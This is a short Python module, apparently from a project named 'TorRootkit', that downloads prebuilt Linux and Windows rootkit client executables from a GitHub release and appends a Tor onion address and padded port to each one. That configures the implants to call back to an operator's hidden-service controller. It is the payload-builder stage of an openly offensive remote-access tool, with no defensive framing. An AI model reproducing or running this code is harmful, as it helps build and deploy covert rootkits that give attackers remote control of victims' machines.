from lib2to3.pgen2.grammar import opmap_raw
import requests
from shell_ui.style import (
    Style,
    ProgressSpinner
)
def download_executionables():
    ps = ProgressSpinner('Downloading sample executionalbles')
    ps.start()
    client_linux = requests.get('https://github.com/emcruise/TorRootkit/releases/download/linux-latest/client')
    client_win = requests.get('https://github.com/emcruise/TorRootkit/releases/download/win-latest/client.exe')
    ps.stop()
    print()
    Style.pos_sys_msg('Downloading is complete')
    with open('/executables/client_linux', 'wb') as client_linux_file:
        client_linux_file.write(client_linux.content)
    with open('/executables/client_win.exe', 'wb') as client_win_file:
        client_win_file.write(client_win.content)
def append_address(onion, port):
    port = str(port)
    for path in ['/executables/client_linux', '/executables/client_win.exe']:
        with open(path, 'a') as file:
            file.write(onion)
            if len(port) < 5:
                rest = 5 - len(port)
                port = rest * '0' + port
            file.write(port)
    Style.pos_sys_msg('Appended onion address and port to executables')
    